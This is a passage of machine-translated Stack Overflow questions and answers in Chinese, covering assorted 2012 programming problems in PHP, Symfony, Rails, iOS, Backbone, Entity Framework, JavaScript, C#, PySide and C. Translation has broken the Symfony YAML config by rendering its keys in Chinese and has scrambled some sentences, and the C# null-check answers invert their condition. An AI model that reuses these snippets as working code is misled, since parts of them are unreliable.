有几种方法可以做到这一点，或者使用 atk4 功能、mysql 事务或作为应用程序设计的一部分。

* * *

**1）自己管理id列**

我假设您在 MySQL 中使用自动增量列，因此一个选项是不进行此自动增量，而是使用序列并选择下一个值并将其保存在您的 memorize 语句中，并使用 -> 将其作为 defaultValue 添加到模型中defaultValue($this->api->recall('new_id')

* * *

**2）关闭自动提交并围绕插入创建事务**

我来自 oracle 背景而不是 MySQL，但 MySQL 还允许您将多个语句包装在一个事务中，这可以保存所有内容或回滚，因此如果您可以创建事务，这也是一个选项，那么您仍然可以保存但如果所有步骤都完成，则只会提交填充多个表的完整事务。

在 atk 4.1 中，DBlite/mysql.php 类包含一些用于事务支持的函数，但[agiletoolkit.org](http://old.agiletoolkit.org/doc/dblite/DBLite)上的文档不完整，并且不清楚如何更改正在使用的 dbConnect，因为当前您使用连接到 lib/Frontend.php 中的数据库$this->dbConnect() 但没有传递参数的选项。

看起来您可以在第一页的开头使用它来执行所需的事务命令

```
 $this->api->db->query('SET AUTOCOMMIT=0');
 $this->api->db->query('START TRANSACTION'); 
```

然后根据需要在各个页面中插入。请注意，所做的一切都将包含在事务中，因此如果用户没有完成该过程，则不会保存任何内容。
在最后插入时，

```
 $this->api->db->query('COMMIT'); 
```

然后，如果您愿意，请重新打开自动提交，以便提交每个 SQL 语句

```
 $this->api->db->query('SET AUTOCOMMIT=1'); 
```

我还没有尝试过，但希望这会有所帮助。

* * *

**3) 使用 beforeInsert 或 afterInsert**

您还可以查看覆盖模型上的 beforeInsert 函数，该函数具有数据数组，但我认为如果您的 id 是一个自动增量列，它不会有值，直到 afterInsert 函数具有插入的 Id 的参数.

* * *

**4) 使用状态来表示完整的记录**

最后，您可以在记录中使用状态列来指示它仅处于第一阶段，并且只有在最后阶段完成时才会更新为完整状态。然后，您可以有一个定期运行的内务作业，以删除未完成所有阶段的记录。您在其中显示这些记录的任何网格或 crud 都将在模型中使用 AddCondition('status','C') 进行限制，或者在页面中添加，以便永远不会显示不完整的记录。

**5）将事务管理为非sql**

正如 Romans 所建议的，您可以将表单处理的结果存储在会话变量中，而不是直接存储到数据库中，然后在最后一步完成后使用 SQL 将其插入。

# cakephp - 对于正确的 CakePHP 约定，我将如何存储我将在执行时放在一起的脚本文件片段？

> ID：11702597
> 
> 赞同：0
> 
> 时间：2012-07-28T16:10:51.367
> 
> 标签：cakephp, text, cakephp-2.1

我正在做一个小项目，其中 CakePHP 将输出脚本，该脚本将由另一个客户端解释。

到目前为止，我有一个布局设置，可以正确显示脚本并且只显示脚本。我只是将它设置为一个数组，其中每个新行作为数组中的一个新行。然后视图只是通过一个 foreach 来显示它们，没问题。这是完美的工作。

现在我想做的是把蛋糕切片和不同的预制脚本部分切在一起。基本上，我会将“方法”存储为某种单独的文件，然后可以根据需要由 cakephp 调用并组合在一起以制作单个脚本。

我想知道的是
：如果我遵循蛋糕约定，这些文本文件应该存储在哪里以及如何存储？
湾。调用这些文件并将它们设置为数组的最简单方法是什么？

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T18:48:29.383

一种。
我会在文件夹中创建一个名为`Scripts/`的`app/View/Elements/`文件夹。
对于每个单独的脚本，在该文件夹中创建一个文件。例如`somefunction.ctp`。
这些脚本可以通过调用来打印`echo $this->element('Scripts/somefunction');`（省略“.ctp”扩展名）

湾。
将这些文件的内容放在一个数组中可以是这样的：

```
array_push( code_array, $this->element('Scripts/somefunction') ); 
```

# security - 无法从不安全区域访问 app.user

> ID：11702601
> 
> 赞同：1
> 
> 时间：2012-07-28T16:11:12.277
> 
> 标签：security, symfony, acl

如何从不安全的区域获取 app.user？

所以我有从 ^/user 开始的安全区域。

但我需要在每个人都可以访问且不安全的区域显示注销表单。这怎么可能？我的security.yml：

```
安全：
    编码器：
        Symfony\Component\Security\Core\User\User：明文
        ###：
            算法：sha512
            编码为base64：真
            迭代次数：10
        ###：
            算法：sha512
            编码为base64：真
            迭代次数：10

    角色层次结构：

    提供者：
      行政：
        名称：管理员
        实体：{类：###，属性：登录}
      用户：
        姓名：用户
        实体：{类：###，属性：登录}        

    防火墙：
      行政：
        模式：^/管理员
        表单登录：
          登录路径：###_登录
          check_path: ###_login_process
          default_target_path: /admin/dashboard
        匿名：~
        登出：
          路径：/admin/logout
          目标：/admin/login
        提供者：管理员
        记住账号：
            钥匙： ”＃＃＃”
            寿命：604800
            小路： /
            域名：~
      用户：
        模式：^/用户
        表单登录：
          登录路径：###_登录
          check_path: ###_login_process
          默认目标路径：###
        匿名：~
        登出：
          路径：/用户/注销
          目标：/用户/登录
        提供者：用户
        记住账号：
            钥匙： ”＃＃＃”
            寿命：604800
            小路： /
            域名：~             

    访问控制：        
        - { 路径：^/admin/login，角色：IS_AUTHENTICATED_ANONYMOUSLY }
        - { 路径：^/admin/，角色：ROLE_ADMIN }
        - { 路径：^/user/login，角色：IS_AUTHENTICATED_ANONYMOUSLY }
        - { 路径：^/user/，角色：ROLE_USER }                   

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:02:59.640

好吧，我改变了一点我的security.yml。所以目前一切正常。

```
      用户：
        模式：^/   

    访问控制：
        - {路径：^/，角色：IS_AUTHENTICATED_ANONYMOUSLY}
        ...

```

**更新 1**

似乎不需要 access_controll 中的那一行。此外，由于某种原因（可能是缓存）匿名用户正在访问 /user 区域

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-26T08:35:05.647

你可以在一些不安全的地方获取 app.user，因为 Symfony 的安全依赖于 2 种不同的机制：身份验证和授权。

**身份验证**由防火墙定义。一旦你进入防火墙，你就会得到一个令牌，最终得到一个 app.user，即使它是`anonymous`.

**Authorization** is related to `access_control` rules. It is a second step, you can't put access control rules outside of a firewall. There you will deal with the ROLE requirement, in example if `ROLE_ANONYMOUS` is enoug, if you want `ROLE_USER`...

One more thing: to complexify a little further, a firewall can allow or disallow anonymous users. By default it is true, as it is **required** to have you login and login_check paths under yoru firewall though you cant' require there users to have a role other than `ROLE_ANONYMOUS` (if you do so, you will have an infinite loop).

# ruby-on-rails - 在模型中使用方法连接 Rails 中其他模型的正确性

> ID：11702602
> 
> 赞同：0
> 
> 时间：2012-07-28T16:11:16.657
> 
> 标签：ruby-on-rails, activerecord

也许标题令人困惑，但我不知道如何解释我的怀疑。

假设我有以下类方法，它们将有助于进行链接以查询名为 Player 的模型。玩家属于用户，但如果我想从特定村庄或城市获取玩家，我必须获取用户模型。

```
def self.by_village(village)
  joins(:user).where(:village => "village")
end

def self.by_city(city)
  joins(:user).where(:city => "city")
end 
```

假设我想按村庄和城市来获取玩家，所以我会这样做......

```
Player.by_city(city).by_village(village). 
```

这将两次加入用户，我认为这是不正确的..对吗？

所以我的问题是：这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T17:01:37.013

我没有尝试过，但我会通过 ActiveRecord 生成的实际 sql 查询来判断您的问题的答案。如果它只有一个连接，我会像你一样使用它，如果这导致两个连接，你可以创建一个方法 by_village_and_city。

好的。现在试了一下：

```
1.9.2p290 :022 > Player.by_city("Berlin").by_village("Kreuzberg")
  Player Load (0.3ms)  SELECT "players".* FROM "players" INNER JOIN "users" ON "users"."id" = "players"."user_id" WHERE "users"."city" = 'Berlin' AND "users"."village" = 'Kreuzberg'
 => [#<Player id: 1, user_id: 1, created_at: "2012-07-28 17:05:35", updated_at: "2012-07-28 17:05:35">, #<Player id: 2, user_id: 2, created_at: "2012-07-28 17:08:14", updated_at: "2012-07-28 17:08:14">] 
```

所以，ActiveRecors 结合了这两个查询，做正确的事，我会使用它，除了：我不得不改变你的实现：

```
class Player < ActiveRecord::Base
  belongs_to :user
  def self.by_village(village)
    joins(:user).where('users.village' => village)
  end

  def self.by_city(city)
    joins(:user).where('users.city' => city)
  end
end 
```

并且您所做的通常是使用[参数化范围](http://guides.rubyonrails.org/active_record_querying.html#passing-in-arguments)处理的：

```
class Player < ActiveRecord::Base
  belongs_to :user

  scope :by_village, lambda { |village| joins(:user).where('users.village = ?', village) }
  scope :by_city, lambda { |city| joins(:user).where('users.city = ?', city) }

end 
```

# ios - iOS：UITableView 数据源必须从 tableView:cellForRowAtIndexPath 返回一个单元格：

> ID：11702603
> 
> 赞同：2
> 
> 时间：2012-07-28T16:11:19.320
> 
> 标签：ios, datasource, tableview

我检查了其他一些问题，但仍然无法弄清楚为什么会发生这种情况。我所知道的是，在使用[此](https://stackoverflow.com/questions/11290746/uitableview-datasource-must-return-a-cell-from-tableviewcellforrowatindexpath)问题中的描述代码后，单元格的值为`null`. 我已经正确设置了`delegate`和`datasource`，但`table`我看不出哪里出了问题。

如果我将以下方法的返回值设置为 0，则不会发生错误，因为该`cellForRowAtIndexPath`方法并没有真正发生。因此，如果我将其设置为 1（应该如此），它将引发错误。我已经合成`NSArray`并检查了它的填充（尽管我猜这不重要）并且基本上意味着发生的事情是我按下`button`搜索然后将结果放在`table`. 所以在此之前`tableview`是空的。

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
} 
```

这是`cellForRowAtIndexPath`方法本身。我也尝试过使用基本模板方法，但仍然会引发相同的错误。

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath     *)indexPath
    {
        static NSString *CellIdentifier = @"Cell";
        UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    // Configure the cell...

    NSDictionary *aResult = [results objectAtIndex:[indexPath row]];
    NSLog(@"RESULTS IN TABLE %i", [results count ]);

    id key = [results objectAtIndex:[indexPath row]];
    resultTitle.text=@"Hello";

    NSURL *url = [NSURL URLWithString:[aResult objectForKey:@"url"]];
    NSData *data = [NSData dataWithContentsOfURL:url];
    cell.imageView.image = [UIImage imageWithData:data];
    cell.selectionStyle = UITableViewCellSelectionStyleNone;
    [theTableView reloadData];

    return cell;
} 
```

我不知道出了什么问题。我以前使用`tableviews`过这个项目，并将这个项目与其他项目进行了比较，看看我是否遗漏了一些东西，但我看不出任何真正的差异。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-28T16:19:30.740

如果从 dequeue 方法返回 nil，则您没有初始化单元格

改变

```
UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier]; 
```

至

```
UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (!cell)
    cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:14:13.017

您没有返回第 0 部分中的行数的方法 - 这是必需的数据源方法（在这种情况下）。

# javascript - 相对链接和backbone.js 路由器

> ID：11702610
> 
> 赞同：2
> 
> 时间：2012-07-28T16:12:22.973
> 
> 标签：javascript, jquery, html, backbone.js

我在backbone.js 中使用路由器功能并遇到了这个问题。这可能是一件微不足道的事情，但我似乎无法弄清楚这一点，也无法在 Google 上找到任何东西。

**问题：**页面上`http://www.mydomain.com/user/1`有一个链接。此链接应链接到`http://www.mydomain.com/user/1/profile`.

当然，如果我使用`<a href="1/profile">`我得到我正在寻找的东西，但`1`它是一个动态生成的值。那么我的路由器应该如何定义路由呢？`1`我认为将数字硬编码到路线中并不是一个明智的选择。

```
//Router

var AppRouter = Backbone.Router.extend({

    routes: {
        '': 'profile',
        'profile': 'profile'
    },

    profile: function() {

    }
});

var app = new AppRouter();
Backbone.history.start(); 
```

当我设置标签的`href`属性like时，结果的链接是.`a``<a href="profile">``http://www.mydomain.com/user/profile`

因为`<a href="./profile">`我得到`http://www.mydomain.com/user/profile`.

因为`<a href="/profile">`我得到`http://www.mydomain.com/profile`.

因为`<a href="profile/">`我得到`http://www.mydomain.com/profile/`.

为什么会`1`丢失，我怎样才能保持它来实现我想要的？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T19:07:13.803

您不能直接在 HTML 中定义此动态 URL，您必须将它们创建到您的视图中。

例如：

**模板：**

```
<script type="text/template" id="template-element">
  <h1><%= title %></h1>
  <a class="profile" href="<%= url_profile %>">profile</a>
</script> 
```

**js代码：**

```
// code simplified and no tested
var Element = Backbone.Model.extend({
  initialize: function(){
    this.set( "url_profile", this.url() + "/profile" );
  }
});

var ElementView = Backbone.View.extend({
  template: _.template( $("#template-element").html() ),

  render: function(){
    this.$el.html( this.template( this.model.toJSON() ) );
    return this;
  }
}); 
```

或者，就像我有时遇到阻碍时所做的那样：

**模板：**

```
<script type="text/template" id="template-element">
  <h1><%= title %></h1>
  <a class="profile" href="#replace_with_real_url">profile</a>
</script> 
```

**js代码：**

```
// no Element.url_profile attribute needed:
var ElementView = Backbone.View.extend({
  template: _.template( $("#template-element").html() ),

  render: function(){
    this.$el.html( this.template( this.model.toJSON() ) );
    this.$el.find( ".profile" ).attr( "href", "/user/" + this.model.id + "/profile" );
    return this;
  }
}); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-07-28T16:27:36.890

[正如您在http://backbonejs.org/#Router](http://backbonejs.org/#Router)中看到的那样，您可以在路由中使用参数，如`'/user/:id/profile'`

# .net - 函数导入重复同一行

> ID：11702611
> 
> 赞同：0
> 
> 时间：2012-07-28T16:12:29.407
> 
> 标签：.net, entity-framework

我正在使用实体框架来访问我在 MSSQL 服务器上的数据。我通过函数导入调用存储过程。当我遍历返回数据的行时，这些行都与第一行相同。存在正确的行数。当我在 Management Studio 中执行存储过程时，返回的数据符合预期；3 个独特的行。

这是我用来浏览数据的代码：

```
packprofileModel.packprofileEntities ppe = new packprofileModel.packprofileEntities();
var res = ppe.Resources.Where(r => r.Id.Equals(rid)).SingleOrDefault();
var ats = ppe.ResourceAttributes(res.Id);
ats.ToList().ForEach(a =>
{
     AttributePanel.Controls.Add(new Label() { Text = a.Title });
}); 
```

谢谢你看我的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T16:24:45.557

如果函数导入的结果映射到实体并且实体没有主键或映射为键的列没有唯一值，通常会发生这种情况。要么解决映射键的问题（键必须始终唯一），要么将结果映射为复杂类型而不是实体。

# javascript - 溢出时删除最后一条消息

> ID：11702612
> 
> 赞同：2
> 
> 时间：2012-07-28T16:12:29.797
> 
> 标签：javascript, height, message, offset

这是一个示例，以解释我要实现的目标

* * *

Jimmy：嘿，我是从 PHP 发出的一条新消息，我是新来的，我已附加到消息日志中 :)！

汤米：嘿你！更多我们的消息来了，你很快就会被删除！

Jonny：对了，在 Jimmy 被赶出我们的盒子（div）之前，这只是一条信息。

10秒后……

汤米：嘿你！更多我们的消息来了，你很快就会被删除！

强尼：是的，在吉米因为被击倒而被移除之前，这只是一条信息。

比利：大家好！.. 等等吉米去哪儿了？

强尼：箱子太满了，所以我们中的一个人不得不离开，吉米在上面，所以他离开了。说到这里，汤米来了！*汤米被删除*。

* * *

使用 setInterval，我设法实现了类似的效果，但是，它只会删除 BOTTOM 溢出的一个，这是最新的，而不是消息是“旧”的顶部。

这是我为实现这一目标而创建的代码......

```
var message=document.getElementById('chat_wrap');

if(message.scrollHeight>message.offsetHeight) {
Element.remove();
} 
```

所以基本上，我想要我所做的相反。但我不确定如何实现这一目标。

* * *

更新以使其更清晰：

* * *

对不起，我的解释不是很清楚。一个很好的例子是水瓶，当它装满时，从底部取出水，而不是从顶部取出。另一种解释我要实现的目标的方法基本上是最新的是优先级，所以如果最新的需要 div 中的空间，那么删除仍然存在的最旧的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:51:32.983

这是一个工作示例。

[http://jsfiddle.net/JNahf/2/](http://jsfiddle.net/JNahf/2/)

```
<div id="messages">
</div>
<button id="insertAMessage">Insert a message</button> 
```

**脚本**

```
$(function(){
    var removeOldest = function(){
        var messages = $("#messages");
        var maxHeight = messages.height();
        var height = 0;

        $(messages.children().get().reverse()).each(function(){
            height += $(this).height();
            if (height > maxHeight)
               $(this).remove();
        });
    };

    $("#insertAMessage").click(function(){
       $('<div class=".messageItem">bla bla bla bla</div>').appendTo("#messages");
       removeOldest();
   });
});​ 
```

我正在使用 jquery，因为它很简单。如果您不使用 jquery，则想法是相同的，但您需要调整代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T17:03:19.820

至少... 看看，我使用 jQuery 来完成任务。

HTML：

```
<div id="chat"></div> 
```

JavaScript：

```
// messages to be processed
var messages = [{
    id: 1,
    from: "David",
    text: "Test 1"
}, {
    id: 2,
    from: "David",
    text: "Test 2"
}, {
    id: 3,
    from: "David",
    text: "Test 3"
}, {
    id: 4,
    from: "David",
    text: "Test 4"
}, {
    id: 5,
    from: "David",
    text: "Test 5"
}, {
    id: 6,
    from: "David",
    text: "Test 6"
}];

// how many messages the container acepts?
var maxMessages = 3;

// how many messages the container has?
var messageCounter = 0;

// what is the index of the message that is being currently processed
var currentIndex = 0;

// the messages that was processed (It will work like a queue (FIFO)
var processedMessages = [];

$(function(){
    // processes one message for each 3 seconds
    setInterval( function(){

        // the current message
        var message = messages[currentIndex++];

        // is there a message to process?
        if ( message ) {

            // yes, there is!

            // first, removes the oldest if the max quantity was reached
            if ( messageCounter == maxMessages ) {

                // the container now will have minus one message
                messageCounter--;

                // what is the oldest one?
                // removes from the queue head
                var oldest = processedMessages.pop();

                // removes from the container
                $( "#message_" + oldest.id ).remove();

            }

            // new message incoming!
            messageCounter++;

            // inserts the new message at the queue tail
            processedMessages.unshift( message );

            // inserts the message in the container
            $( "#chat" ).append( "<div id='message_" + message.id + "'>From " +
                                 message.from + ": " + message.text + "</div>" );

        } else {

            // there is no message
            currentIndex--;

        }

    }, 3000 );

}); 
```

JsFiddle：http: [//jsfiddle.net/davidbuzatto/Ep4tk/](http://jsfiddle.net/davidbuzatto/Ep4tk/)

# c# - 如何将 NULL 值插入数据库

> ID：11702618
> 
> 赞同：1
> 
> 时间：2012-07-28T16:13:36.817
> 
> 标签：c#, sql-server, ado.net

当我点击一个按钮时，它应该保存我对数据库所做的更改，这是按钮的代码：

```
DataRow drow = sql.ds.Tables["Stagiaire"].NewRow();
        Boolean allowAdd = false;
        if (nom.Text != "" && prenom.Text != "")
            allowAdd = true;
        if (allowAdd)
        {
            drow[1] = imgData;
            drow[2] = nom.Text.ToUpper();
            drow[3] = prenom.Text;
            drow[4] = sexe.SelectedItem.ToString();
            drow[5] = naiss.Text;
            drow[6] = email.Text;
            drow[7] = tele.Text;
            drow[8] = adresse.Text;
            drow[9] = niveau.Text;
            drow[10] = filiere.Text;
            drow[11] = stage.SelectedItem.ToString();
            drow[12] = service.SelectedItem.ToString();
            drow[13] = encadrant.SelectedItem.ToString();
            drow[14] = etablissement.SelectedItem.ToString();
            sql.ds.Tables["Stagiaire"].Rows.Add(drow);
            SqlCommandBuilder cmb = new SqlCommandBuilder(daStagiaire);
            daStagiaire.Update(sql.ds, "Stagiaire");
            XtraMessageBox.Show("Bien Ajouter !");
        } 
```

**我的问题是：如果文本控制器为空，我如何将 NULL 值插入数据库**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:15:29.633

传递`DBNull.Value`给数据库：

```
drow[11] = string.IsNullOrWhitespace(stage.SelectedItem)
           ? (object) stage.SelectedItem.ToString() 
           : DBNull.Value; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:23:43.673

对于每个字段，您需要检查字符串是否包含值。如果它有一个值，则传递该值，如果它没有一个值，则传递 NULL。

```
drow[1] = string.IsNullOrWhitespace(imgData)
           ? (object) imgData : DBNull.Value;

drow[2] = string.IsNullOrWhitespace(nom.Text)
           ? (object) nom.Text.ToUpper : DBNull.Value; 
```

*...对其余项目执行相同的逻辑。*

在这里，我使用单行 IF THEN 语句。查看 [One-liner if statements，如何转换此 if-else-statement](https://stackoverflow.com/questions/4622600/one-liner-if-statements-how-to-convert-this-if-else-statement)以获取更多信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-29T13:45:42.037

你可以用`dbnull.value`

但请确保在获取此 null 值时，添加适当的 null 检查

# qt - 为什么不添加菜单？

> ID：11702621
> 
> 赞同：4
> 
> 时间：2012-07-28T16:14:00.030
> 
> 标签：qt, pyqt, pyside, qmainwindow

我显然在这里遗漏了一些东西；为什么这个小示例应用程序中没有添加文件菜单？

```
import sys
from PySide.QtGui import *

class Window(QMainWindow):
    def __init__(self):
        super(Window, self).__init__()
        self.setWindowTitle('Test')
        layout = QHBoxLayout()
        self.widget = QWidget()
        self.widget.setLayout(layout)
        self.setCentralWidget(self.widget)
        self.exitAction = QAction('Exit', self, shortcut=QKeySequence.Quit, triggered=self.close)
        self.fileMenu = self.menuBar().addMenu('File')
        self.fileMenu.addAction(self.exitAction)

app = QApplication(sys.argv)
w = Window()
w.show()
sys.exit(app.exec_()) 
```

编辑：

好的，看起来这实际上是一个 unicode 问题。这是另一个示例应用程序：

```
from __future__ import unicode_literals, print_function, division
import sys
from PySide.QtCore import *
from PySide.QtGui import *

class Window(QMainWindow):
    def __init__(self):
        super(Window, self).__init__()
        self.dummyAction = QAction(self.tr('dummy'), self, triggered=self.dummy)
        self.gameMenu = self.menuBar().addMenu(self.tr('ddddummy'))
        print (self.tr('dummy'))
        self.gameMenu.addAction(self.dummyAction)
        layout = QHBoxLayout()
        self.widget = QWidget()
        self.widget.setLayout(layout)
        self.setCentralWidget(self.widget)

    def dummy(self):
        pass

locale = QLocale.system().name()
qtTranslator = QTranslator()
app = QApplication(sys.argv)
if qtTranslator.load('qt_' + locale, ':/'):
    app.installTranslator(qtTranslator)
w = Window()
w.show()
sys.exit(app.exec_()) 
```

这个应用程序没有“文件”或“退出”或“退出”——但如果我注释掉该行，或者将引用的字符串包围起来，它就*可以工作*，而不是`from __future__``self.tr(str('foo'))``self.tr('foo')`

编辑2：

```
from __future__ import unicode_literals
import sys
from PySide.QtGui import *

class Window(QMainWindow):
    def __init__(self):
        super(Window, self).__init__()
        print self.tr('foo')

app = QApplication(sys.argv)
Window().show()
sys.exit(app.exec_()) 
```

这应该打印'foo'，但什么也不打印。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-28T18:27:45.657

乍一看，您的代码似乎完全正常，并且在 windows 或 linux 上的功能与预期的一样。这里的问题是，在 OSX 上，操作系统在菜单上强制执行标准界面。而在其他操作系统上，菜单嵌套在您的应用程序下，您的应用程序拥有它......在 OSX 上，操作系统拥有它。因此它显示在全局菜单区域中。

话虽如此，OSX 正在过滤掉一些保留的关键字，如“退出”或“退出”。这是因为退出功能是自动放置在应用程序菜单中的标准。当您将它作为基本的 Python 脚本运行时，菜单将被称为“Python”。但是，如果您将它捆绑到一个应用程序中，它将为您的捆绑应用程序相应地命名。

此处的此[链接](http://doc.qt.nokia.com/4.7-snapshot/mac-differences.html#limitations)虽然不是确切的解释，但确实提到了 OSX 上菜单的差异。

有关修复菜单的快速示例，请查看执行操作时会发生什么：

```
 self.exitAction = QAction('Kwit', self) 
```

OSX 不会过滤掉那个。但我认为最好遵循使平台上的所有应用程序体验相同的原生标准。您肯定会像现在一样包含“退出”菜单操作，这样如果在 linux 或 windows 上运行，您的应用程序将是跨平台的，并且只期望 OSX 会为您重新定位它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-19T10:24:15.953

我遇到了这个线程，因为我正在努力解决类似的问题。这是我发现的...

关于您的编辑 2：如果您替换该行，您的代码将正确打印“foo”

```
Window().show() 
```

对于线

```
w = Window()
w.show() 
```

正如您在原始代码中所做的那样。显然构造函数的返回类型导致链接成为python中的一个问题？

通过注释掉该`from __future__`行，我能够重现您的 EDIT 1。否则，下面的代码在 OS X 中按预期工作（Mountain Lion 10.8.3 with brewed python）。具体来说，以下代码将“关于”操作放在 OS X 创建的“Python”应用程序菜单下，并创建一个包含“网站”操作的“帮助”菜单。

```
import sys
from PySide.QtGui import QApplication,QMainWindow, QWidget, QAction

class MainWindow(QMainWindow):
    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.create_menus()
        self.create_main_frame()

    def create_menus(self):
        self.aboutAction = QAction('About', self, triggered=self.on_about)
        self.websiteAction = QAction('Website', self, triggered=self.on_website)
        self.help_menu = self.menuBar().addMenu('Help')
        self.help_menu.addAction(self.aboutAction)
        self.help_menu.addAction(self.websiteAction)

    def create_main_frame(self):
        self.mainWidget = QWidget()
        self.setCentralWidget(self.mainWidget)

    def on_website(self):
        pass

    def on_about(self):
        pass

app = QApplication(sys.argv)
w = MainWindow()
w.show()
sys.exit(app.exec_()) 
```

我应该提请注意这个线程帮助我发现的一个重要点。我已经看到了很多关于 OS X 的建议，这些建议表明您应该`menu_bar = QMenuBar()`独立创建`QMainWindow`然后与`self.setMenuBar(menu_bar)`where`self`代表绑定`QMainWindow`。事实上，这对我不起作用。相反，起作用的是直接从 QMainWindow 类本身获取菜单栏引用。例如，和上面一样，在添加菜单时，使用`self.help_menu = self.menuBar().addMenu('Help')`如上。

# google-maps-api-3 - 当前标记到地图边界的距离

> ID：11702622
> 
> 赞同：1
> 
> 时间：2012-07-28T16:14:05.757
> 
> 标签：google-maps-api-3, google-maps-markers, distance

我需要标记和地图边界之间的当前距离来决定：在标记的左侧、右侧、上方或下方绘制提示框。

我用这些代码行设置了tipbox的位置：

```
Label.prototype.draw = function() {
  var projection = this.getProjection();
  var position = projection.fromLatLngToDivPixel(this.get('position'));

  // position of tipbox, depends on margin to map boaunds
  var div = this.div_;
  var mapWidth = parseInt($('#mapBox').css('width'));
  var mapHeight = parseInt($('#mapBox').css('height'));

  div.style.left = (position.x-(parseInt(div.style.width)/2)) + 'px';
  div.style.top = position.y + 'px';      
  div.style.display = 'inline';

  $('.tipBox-inner').html(''+position.x);
}; 
```

但如果我拖动页面， position.x 或 position.y 返回相同数量的像素。正如您在图像上看到的，x 位置为 300 像素（！）。如果标记位于页面底部，我会在标记顶部绘制提示框，依此类推。

![在此处输入图像描述](../Images/a3f2fc4404cbf34cd0f6e99ce5422eb7.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:18:28.460

好的，我自己找到了解决方案。我在标记的鼠标悬停事件中得到距离（px）到边距：

```
google.maps.event.addListener(marker, 'mouseover', function(event) {    
  label = new Label({
    map: map
  });

  label.bindTo('position', marker, 'position');

  var pixel = label.getProjection().fromLatLngToContainerPixel(event.latLng);

  label.set('mouseX', pixel.x);
  label.set('mouseY', pixel.y);
}); 
```

现在我可以通过 this.get('mouseX') 在标签的 draw-functionf 中使用 mouseX 和 mouseY

# c - C 错误：表达式必须有一个常量值

> ID：11702629
> 
> 赞同：5
> 
> 时间：2012-07-28T16:15:09.413
> 
> 标签：c, arrays, compiler-errors

我正在编写一些嵌入式代码以通过 SPI 与外部设备交互。该设备有几个不同长度的寄存器，为了帮助保持直截了当，我定义了以下结构

```
typedef struct
{
    uint16_t    Signed          :1;  // Register is signed or unsigned
    uint16_t    CommLengthBytes :3;  // The width of the register in bytes 
    uint16_t    Address         :12; // Register address
}ts_register; 
```

然后，我在源代码中定义了每个寄存器，如下所示

```
static const ts_register    SAGCYC      = {0, 1, 0x000};
static const ts_register    DISNOLOAD   = {0, 1, 0x001};
static const ts_register    LCYCMODE    = {0, 1, 0x004};
static const ts_register    IRMSA       = {0, 4, 0x31A};
static const ts_register    IRMSB       = {0, 4, 0x31B};
static const ts_register    VRMS        = {0, 4, 0x31C}; 
```

等等

我有一个函数，它将获取一个指向 ts_registers 数组的指针，并将读取数组中所有寄存器所需的 SPI 传输排队，并调用回调函数来处理回复

当我尝试使要读取的 ts_registers 数组如下时出现我的问题：

```
ts_register regs_to_read[3] = {VRMS, IRMSA, IRMSB}; 
```

这会产生错误：“表达式必须有一个常量值”3 次（每个数组元素一次）。

由于它们被定义为常量，我忽略了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-28T16:20:10.000

> 由于它们被定义为常量，我忽略了什么？

在 C 中使用`const`修饰符声明的对象**不是真正的常量**。const 的更好名称可能是`readonly`- 它的真正含义是编译器不会让*您*更改它。而且您需要真正的常量来初始化具有静态存储的对象（我怀疑`regs_to_read`是全局的）。

您可以尝试`regs_to_read`在其他任何东西使用该数组之前分配一个调用的函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T16:21:08.767

const 不会在编译时使它们成为常量。让它们#defines，编译器会很高兴。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T16:33:08.320

我认为这可能是编译器问题，了解您的平台以及如何构建此代码会很有帮助。我只是拿走了你的大部分代码，修改它来编译它，并在 Linux 上使用 gcc 编译。没有任何警告。

```
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>

typedef struct
{
    uint16_t    Signed          :1;  // Register is signed or unsigned
    uint16_t    CommLengthBytes :3;  // The width of the register in bytes 
    uint16_t    Address         :12; // Register address
}ts_register;

int main(int argc, char **argv) {

    static const ts_register    SAGCYC      = {0, 1, 0x000};
    static const ts_register    DISNOLOAD   = {0, 1, 0x001};
    static const ts_register    LCYCMODE    = {0, 1, 0x004};
    static const ts_register    IRMSA       = {0, 4, 0x31A};
    static const ts_register    IRMSB       = {0, 4, 0x31B};
    static const ts_register    VRMS        = {0, 4, 0x31C};

    ts_register regs_to_read[3] = {VRMS, IRMSA, IRMSB};

    return(0);
} 
```

您是否尝试过强制转换值？这并不总是最好的做法，但会让你绕过错误。

您是否考虑过创建#define 条目？

另外，请注意 const 在 C 中需要一些时间来适应。它们的行为并不总是像您预期的那样。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-09-28T13:57:29.983

如果`regs_to_read`在任何函数范围内声明，则错误将被清除。

# timer - MSP 430G2553 在比较模式下使用 Timer_A 进行采样

> ID：11702633
> 
> 赞同：2
> 
> 时间：2012-07-28T16:15:37.760
> 
